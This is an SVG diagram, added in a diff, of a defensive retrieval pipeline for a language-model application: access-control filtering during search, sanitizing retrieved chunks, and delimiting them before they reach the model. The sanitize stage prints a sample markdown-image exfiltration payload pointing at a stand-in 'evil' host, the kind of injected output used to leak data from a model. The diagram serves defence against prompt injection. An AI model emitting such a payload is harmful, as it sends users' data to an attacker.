@@ -1,0 +1,75 @@
+<svg viewBox="0 0 1200 470" xmlns="http://www.w3.org/2000/svg" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif" role="img" aria-labelledby="rag-title rag-desc">
+  <title id="rag-title">Retrieval pipeline with authorization filtering and context isolation</title>
+  <desc id="rag-desc">A five-stage retrieval pipeline. The authenticated user query carries a session identity. The vector search applies a hard metadata filter on tenant and role before results are returned. Retrieved chunks are sanitized to remove markdown image exfiltration payloads and script blocks. Surviving text is wrapped in an explicit external content tag before assembly into the context window. A footer states that the authorization filter is enforced and the delimiter tag is advisory only.</desc>
+  <rect width="1200" height="470" fill="#ffffff"/>
+
+  <defs>
+    <marker id="ragArrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0 0 L10 5 L0 10 z" fill="#64748b"/>
+    </marker>
+  </defs>
+
+  <text x="50" y="46" font-size="26" font-weight="850" fill="#0f172a">Retrieval pipeline: authorization filter, then context isolation</text>
+  <text x="50" y="72" font-size="14" fill="#475569">Similarity is not an access-control decision. The authorization filter must run inside the query, not after the results come back.</text>
+
+  <rect x="40" y="100" width="212" height="150" rx="12" fill="#eff6ff" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="60" y="126" font-size="11.5" font-weight="900" letter-spacing="0.8" fill="#2563eb">1. AUTHENTICATED QUERY</text>
+  <line x1="60" y1="138" x2="232" y2="138" stroke="#2563eb" stroke-opacity="0.3" stroke-width="1"/>
+  <text x="60" y="162" font-size="12.5" fill="#475569">Query text plus the</text>
+  <text x="60" y="182" font-size="12.5" fill="#475569">caller identity from the</text>
+  <text x="60" y="202" font-size="12.5" fill="#475569">verified session token</text>
+  <text x="60" y="228" font-size="12.5" font-weight="700" fill="#1d4ed8">never client-supplied</text>
+
+  <rect x="288" y="100" width="212" height="150" rx="12" fill="#eff6ff" stroke="#2563eb" stroke-width="2.5"/>
+  <text x="308" y="126" font-size="11.5" font-weight="900" letter-spacing="0.8" fill="#2563eb">2. FILTERED SEARCH</text>
+  <line x1="308" y1="138" x2="480" y2="138" stroke="#2563eb" stroke-opacity="0.3" stroke-width="1"/>
+  <text x="308" y="162" font-size="12.5" fill="#475569">Hard metadata predicate</text>
+  <text x="308" y="182" font-size="12.5" font-family="ui-monospace,monospace" fill="#1d4ed8">tenant_id = &#8230;</text>
+  <text x="308" y="202" font-size="12.5" font-family="ui-monospace,monospace" fill="#1d4ed8">role IN (&#8230;)</text>
+  <text x="308" y="228" font-size="12.5" fill="#475569">applied during retrieval</text>
+
+  <rect x="536" y="100" width="212" height="150" rx="12" fill="#fffbeb" stroke="#b45309" stroke-width="2.5"/>
+  <text x="556" y="126" font-size="11.5" font-weight="900" letter-spacing="0.8" fill="#b45309">3. SANITIZE</text>
+  <line x1="556" y1="138" x2="728" y2="138" stroke="#b45309" stroke-opacity="0.3" stroke-width="1"/>
+  <text x="556" y="162" font-size="12.5" fill="#475569">Strip script blocks and</text>
+  <text x="556" y="182" font-size="12.5" fill="#475569">markdown image</text>
+  <text x="556" y="202" font-size="12.5" fill="#475569">exfiltration payloads</text>
+  <text x="556" y="228" font-size="12.5" font-family="ui-monospace,monospace" fill="#b45309">![x](https://evil/?d=)</text>
+
+  <rect x="784" y="100" width="212" height="150" rx="12" fill="#fffbeb" stroke="#b45309" stroke-width="2.5"/>
+  <text x="804" y="126" font-size="11.5" font-weight="900" letter-spacing="0.8" fill="#b45309">4. DELIMIT</text>
+  <line x1="804" y1="138" x2="976" y2="138" stroke="#b45309" stroke-opacity="0.3" stroke-width="1"/>
+  <text x="804" y="162" font-size="12.5" fill="#475569">Wrap surviving text in</text>
+  <text x="804" y="182" font-size="12.5" fill="#475569">an explicit tag and</text>
+  <text x="804" y="202" font-size="12.5" fill="#475569">escape the terminator</text>
+  <text x="804" y="228" font-size="12.5" font-family="ui-monospace,monospace" fill="#b45309">&lt;external_content&gt;</text>
+
+  <rect x="1032" y="100" width="128" height="150" rx="12" fill="#e6f4f1" stroke="#0f766e" stroke-width="2.5"/>
+  <text x="1052" y="126" font-size="11.5" font-weight="900" letter-spacing="0.8" fill="#0f766e">5. ASSEMBLE</text>
+  <line x1="1052" y1="138" x2="1140" y2="138" stroke="#0f766e" stroke-opacity="0.3" stroke-width="1"/>
+  <text x="1052" y="162" font-size="12.5" fill="#475569">Context</text>
+  <text x="1052" y="182" font-size="12.5" fill="#475569">window</text>
+  <text x="1052" y="208" font-size="12.5" fill="#475569">handed to</text>
+  <text x="1052" y="228" font-size="12.5" fill="#475569">the model</text>
+
+  <path d="M252 175 L284 175" stroke="#64748b" stroke-width="2.5" fill="none" marker-end="url(#ragArrow)"/>
+  <path d="M500 175 L532 175" stroke="#64748b" stroke-width="2.5" fill="none" marker-end="url(#ragArrow)"/>
+  <path d="M748 175 L780 175" stroke="#64748b" stroke-width="2.5" fill="none" marker-end="url(#ragArrow)"/>
+  <path d="M996 175 L1028 175" stroke="#64748b" stroke-width="2.5" fill="none" marker-end="url(#ragArrow)"/>
+
+  <rect x="40" y="278" width="546" height="90" rx="12" fill="#e6f4f1" stroke="#0f766e" stroke-width="2"/>
+  <text x="62" y="302" font-size="13" font-weight="800" fill="#0f766e">Stages 1&#8211;2 are enforced</text>
+  <text x="62" y="324" font-size="12.5" fill="#475569">The database applies the predicate. A chunk the caller may not</text>
+  <text x="62" y="344" font-size="12.5" fill="#475569">read is never returned, so it cannot reach the context window</text>
+  <text x="62" y="360" font-size="12.5" fill="#475569">at all.</text>
+
+  <rect x="614" y="278" width="546" height="90" rx="12" fill="#fde8ea" stroke="#9f1239" stroke-width="2"/>
+  <text x="636" y="302" font-size="13" font-weight="800" fill="#9f1239">Stages 3&#8211;4 are advisory</text>
+  <text x="636" y="324" font-size="12.5" fill="#475569">Sanitization is pattern matching, and a delimiter is an instruction</text>
+  <text x="636" y="344" font-size="12.5" fill="#475569">the model may disregard. They lower the hit rate; they do not</text>
+  <text x="636" y="360" font-size="12.5" fill="#475569">create a boundary the model is unable to cross.</text>
+
+  <rect x="40" y="392" width="1120" height="56" rx="10" fill="#f8fafc" stroke="#94a3b8" stroke-width="1.5"/>
+  <text x="60" y="416" font-size="12.5" font-weight="700" fill="#0f172a">Filtering after retrieval is not equivalent: the chunk has already been read out of the store, and any post-filter bug leaks it.</text>
+  <text x="60" y="436" font-size="12.5" fill="#475569">Treat the surviving pipeline as blast-radius reduction, not as a guarantee that retrieved text cannot influence the model.</text>
+</svg>
